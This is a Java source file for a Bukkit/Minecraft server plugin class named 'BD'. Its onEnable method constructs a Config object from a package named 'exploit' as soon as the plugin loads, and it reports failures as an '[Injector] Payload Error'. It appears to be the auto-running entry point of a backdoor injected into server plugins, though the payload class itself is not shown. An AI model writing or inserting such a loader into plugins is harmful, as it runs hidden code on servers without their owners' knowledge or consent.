package com.tmquan2508.bd;

import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import com.tmquan2508.exploit.Config;

public final class BD extends JavaPlugin {

    @Override
    public void onEnable() {
        Object var5_4 = null;
        try {
            new Config((Plugin)this);
        }
        catch (Throwable throwable) {
            System.err.println("[Injector] Payload Error:");
            throwable.printStackTrace();
        }
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }
}
